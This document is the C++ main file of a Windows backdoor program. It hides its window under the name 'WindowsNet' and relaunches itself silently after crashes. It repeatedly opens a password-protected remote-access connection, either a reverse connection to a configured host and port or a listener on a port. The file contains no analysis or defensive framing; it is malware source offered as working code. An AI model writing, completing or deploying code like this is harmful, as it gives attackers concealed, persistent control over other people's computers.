#include "stdafx.h"

#if _MSC_VER < 1600
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
#pragma comment(lib,"msvcrt.lib")
#endif

#define DE
#include "debug.h"
#include "door.h"

#define HostAddr "127.0.0.1"
#define HostPort 3240
#define DoorPass "lx"

//#define LISTENVER

DWORD __stdcall ConnectThread(LPVOID lParam)
{
	int Err = 1;

	while (Err)
	{
		__try
		{
#ifdef LISTENVER
			Err = listendoor(HostPort, DoorPass);
#else
			Err = netdoor(HostPort, HostAddr, DoorPass);
#endif
		}
		__except (1)
		{
			MsgErr(_T("Err"));
		}
	}

	return Err;
}

LONG __stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
{
	char RestartMod[128];
	GetModuleFileName(NULL, RestartMod, 128);

	WinExec(RestartMod, SW_HIDE);

	ExitProcess(0);

	return EXCEPTION_CONTINUE_EXECUTION;
}

int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPTSTR    lpCmdLine,
	int       nCmdShow)
{
	HWND hwnd = CreateWindowExW(
		WS_EX_APPWINDOW,
		L"#32770",
		L"WindowsNet",
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		100,
		100,
		HWND_DESKTOP,
		NULL,
		GetModuleHandleW(0),
		NULL
		);

	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

	SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER(Errdo));

	ConnectThread(NULL);

	return 0;
}